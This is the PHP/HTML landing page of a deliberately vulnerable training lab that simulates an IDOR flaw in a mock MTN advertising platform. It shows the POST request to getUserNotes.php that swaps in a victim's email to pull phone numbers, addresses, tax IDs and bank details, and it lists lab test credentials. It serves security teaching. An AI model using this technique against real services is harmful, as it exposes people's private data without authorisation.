<?php
session_start();
$isLoggedIn = isset($_SESSION['user_id']);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MTN MobAd - Mobile Advertising Platform</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0a0a0a 0%, #1a0a0a 100%);
            min-height: 100vh;
            color: #e0e0e0;
        }
        .header {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border-bottom: 1px solid rgba(255, 204, 0, 0.3);
            padding: 1rem 2rem;
        }
        .header-content {
            max-width: 1200px;
            margin: 0 auto;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .logo {
            display: flex;
            align-items: center;
            gap: 0.75rem;
            font-size: 1.5rem;
            font-weight: bold;
            color: #ffcc00;
            text-decoration: none;
        }
        .logo-icon {
            background: linear-gradient(135deg, #ffcc00, #ff9900);
            color: #000;
            padding: 0.5rem 0.75rem;
            border-radius: 8px;
            font-weight: bold;
        }
        .nav-links {
            display: flex;
            gap: 1.5rem;
            align-items: center;
        }
        .nav-links a {
            color: #e0e0e0;
            text-decoration: none;
            transition: color 0.3s;
        }
        .nav-links a:hover { color: #ffcc00; }
        .btn-back {
            padding: 0.5rem 1rem;
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 204, 0, 0.3);
            border-radius: 6px;
        }
        .hero {
            text-align: center;
            padding: 4rem 2rem;
            max-width: 900px;
            margin: 0 auto;
        }
        .hero h1 {
            font-size: 3rem;
            background: linear-gradient(135deg, #ffcc00, #ff9900);
            -webkit-background-clip: text;
            background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 1rem;
        }
        .hero p {
            font-size: 1.2rem;
            color: #888;
            margin-bottom: 2rem;
        }
        .lab-badge {
            display: inline-block;
            background: rgba(255, 68, 68, 0.2);
            border: 1px solid #ff4444;
            color: #ff6666;
            padding: 0.5rem 1.5rem;
            border-radius: 25px;
            font-size: 0.9rem;
            margin-bottom: 2rem;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 2rem 3rem;
        }
        .vulnerability-card {
            background: rgba(255, 68, 68, 0.1);
            border: 1px solid rgba(255, 68, 68, 0.4);
            border-radius: 20px;
            padding: 2rem;
            margin-bottom: 2rem;
        }
        .vulnerability-card h2 {
            color: #ff6666;
            margin-bottom: 1rem;
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }
        .vulnerability-card p {
            color: #ccc;
            line-height: 1.8;
        }
        .features-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 1.5rem;
            margin-bottom: 2rem;
        }
        .feature-card {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 204, 0, 0.2);
            border-radius: 15px;
            padding: 1.5rem;
            transition: all 0.3s;
        }
        .feature-card:hover {
            border-color: #ffcc00;
            transform: translateY(-3px);
        }
        .feature-icon {
            font-size: 2rem;
            margin-bottom: 1rem;
        }
        .feature-card h3 {
            color: #ffcc00;
            margin-bottom: 0.5rem;
        }
        .feature-card p {
            color: #888;
            font-size: 0.95rem;
        }
        .code-block {
            background: #0d0d0d;
            border: 1px solid #333;
            border-radius: 10px;
            padding: 1.5rem;
            margin: 1.5rem 0;
            overflow-x: auto;
        }
        .code-block pre {
            color: #88ff88;
            font-family: 'Consolas', monospace;
            font-size: 0.85rem;
            white-space: pre-wrap;
            margin: 0;
        }
        .code-comment { color: #666; }
        .code-string { color: #ff8888; }
        .code-key { color: #88aaff; }
        .credentials-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 1rem;
            margin: 1.5rem 0;
        }
        .credential-card {
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 204, 0, 0.3);
            border-radius: 10px;
            padding: 1rem;
        }
        .credential-card h4 {
            color: #ffcc00;
            margin-bottom: 0.5rem;
            font-size: 0.9rem;
        }
        .credential-card code {
            display: block;
            color: #88ff88;
            font-family: monospace;
            margin-top: 0.3rem;
        }
        .credential-card.attacker {
            border-color: #ff4444;
        }
        .credential-card.attacker h4 { color: #ff6666; }
        .credential-card.victim {
            border-color: #00aaff;
        }
        .credential-card.victim h4 { color: #66ccff; }
        .actions {
            display: flex;
            gap: 1rem;
            justify-content: center;
            flex-wrap: wrap;
            margin-top: 2rem;
        }
        .btn {
            padding: 1rem 2rem;
            border-radius: 10px;
            text-decoration: none;
            font-weight: 600;
            transition: all 0.3s;
        }
        .btn-primary {
            background: linear-gradient(135deg, #ffcc00, #ff9900);
            color: #000;
        }
        .btn-secondary {
            background: rgba(255, 255, 255, 0.1);
            border: 2px solid #666;
            color: #ccc;
        }
        .btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 30px rgba(255, 204, 0, 0.3);
        }
        .attack-diagram {
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid rgba(255, 68, 68, 0.3);
            border-radius: 15px;
            padding: 2rem;
            margin: 2rem 0;
            font-family: 'Consolas', monospace;
            font-size: 0.85rem;
            overflow-x: auto;
        }
        .attack-diagram pre {
            color: #88ff88;
            margin: 0;
        }
    </style>
</head>
<body>
    <header class="header">
        <div class="header-content">
            <a href="index.php" class="logo">
                <span class="logo-icon">MTN</span>
                MobAd Platform
            </a>
            <nav class="nav-links">
                <a href="../index.php" class="btn-back">← All Labs</a>
                <a href="docs.php">Documentation</a>
                <a href="lab-description.php">Lab Info</a>
                <?php if ($isLoggedIn): ?>
                    <a href="dashboard.php">Dashboard</a>
                    <a href="logout.php">Logout</a>
                <?php else: ?>
                    <a href="login.php">Login</a>
                <?php endif; ?>
            </nav>
        </div>
    </header>

    <section class="hero">
        <span class="lab-badge">🔓 Lab 15 - Access Control Vulnerability</span>
        <h1>IDOR PII Leakage</h1>
        <p>
            This lab simulates a real vulnerability discovered in an MTN Business platform where 
            an attacker can enumerate personal information by exploiting an IDOR in the getUserNotes API endpoint.
        </p>
    </section>

    <div class="container">
        <div class="vulnerability-card">
            <h2>⚠️ Vulnerability Overview</h2>
            <p>
                The <code>/api/getUserNotes.php</code> endpoint accepts a user email parameter and returns 
                private notes and account information without verifying if the requester is authorized to 
                view that data. An attacker who knows (or guesses) a victim's email can access their 
                <strong>phone number, address, business notes, and other PII</strong>.
            </p>
        </div>

        <div class="features-grid">
            <div class="feature-card">
                <div class="feature-icon">📧</div>
                <h3>Email-Based IDOR</h3>
                <p>The API uses email as the identifier without validating the requester's identity</p>
            </div>
            <div class="feature-card">
                <div class="feature-icon">📱</div>
                <h3>PII Exposure</h3>
                <p>Phone numbers, addresses, tax IDs, and bank account info are leaked</p>
            </div>
            <div class="feature-card">
                <div class="feature-icon">📝</div>
                <h3>Private Notes</h3>
                <p>Confidential business notes and personal memos are accessible</p>
            </div>
            <div class="feature-card">
                <div class="feature-icon">🔑</div>
                <h3>API Keys Exposed</h3>
                <p>User API keys can be enumerated through the vulnerable endpoint</p>
            </div>
        </div>

        <h2 style="color: #ff6666; margin: 2rem 0 1rem;">🎯 Vulnerable Request</h2>
        <div class="code-block">
            <pre><span class="code-comment">// Vulnerable API call - no authorization check on email parameter</span>
POST /api/getUserNotes.php HTTP/1.1
Host: localhost
Content-Type: application/json

{
  <span class="code-key">"params"</span>: {
    <span class="code-key">"updates"</span>: [{
      <span class="code-key">"param"</span>: <span class="code-string">"user"</span>,
      <span class="code-key">"value"</span>: {
        <span class="code-key">"userEmail"</span>: <span class="code-string">"&lt;PUT_VICTIM_EMAIL_HERE&gt;"</span>
      },
      <span class="code-key">"op"</span>: <span class="code-string">"a"</span>
    }]
  }
}</pre>
        </div>

        <div class="attack-diagram">
            <pre>
┌─────────────────────────────────────────────────────────────────────────────────┐
│                              IDOR Attack Flow                                    │
├─────────────────────────────────────────────────────────────────────────────────┤
│                                                                                  │
│  1. Attacker logs in with valid account: attacker@example.com                    │
│                                                                                  │
│  2. Discovers getUserNotes API endpoint in dashboard                             │
│                                                                                  │
│  3. Normal request returns attacker's own data:                                  │
│     POST /api/getUserNotes.php                                                   │
│     { "userEmail": "attacker@example.com" } → Returns attacker's notes ✓        │
│                                                                                  │
│  4. Attacker modifies email to victim's address:                                 │
│     POST /api/getUserNotes.php                                                   │
│     { "userEmail": "victim1@mtnbusiness.com" }                                   │
│                                                                                  │
│  5. Server returns victim's PII without authorization check! ❌                  │
│     - Phone: +234-803-456-7890                                                   │
│     - Address: 45 Victoria Island, Lagos                                         │
│     - Tax ID: TIN-2024-00123                                                     │
│     - Bank Account: GTB-0012345678                                               │
│     - Private Notes, API Keys, etc.                                              │
│                                                                                  │
└─────────────────────────────────────────────────────────────────────────────────┘
            </pre>
        </div>

        <h2 style="color: #ffcc00; margin: 2rem 0 1rem;">🔑 Test Credentials</h2>
        <div class="credentials-grid">
            <div class="credential-card attacker">
                <h4>👤 Attacker Account</h4>
                <code>attacker@example.com</code>
                <code>attacker123</code>
            </div>
            <div class="credential-card victim">
                <h4>🎯 Victim 1 (Business)</h4>
                <code>victim1@mtnbusiness.com</code>
                <code>victim123</code>
            </div>
            <div class="credential-card victim">
                <h4>🎯 Victim 2 (CEO)</h4>
                <code>ceo@bigcorp.ng</code>
                <code>ceo2024secure</code>
            </div>
            <div class="credential-card victim">
                <h4>🎯 Victim 3 (Finance)</h4>
                <code>finance@acme.com.ng</code>
                <code>finance@2024</code>
            </div>
            <div class="credential-card victim">
                <h4>🔐 Admin Account</h4>
                <code>admin@mtnmobad.com</code>
                <code>admin@mtn2024!</code>
            </div>
        </div>

        <div class="actions">
            <a href="login.php" class="btn btn-primary">🚀 Start Lab</a>
            <a href="lab-description.php" class="btn btn-secondary">📋 Lab Details</a>
            <a href="docs.php" class="btn btn-secondary">📚 Documentation</a>
            <a href="setup_db.php" class="btn btn-secondary">🔄 Reset Lab</a>
        </div>
    </div>
</body>
</html>
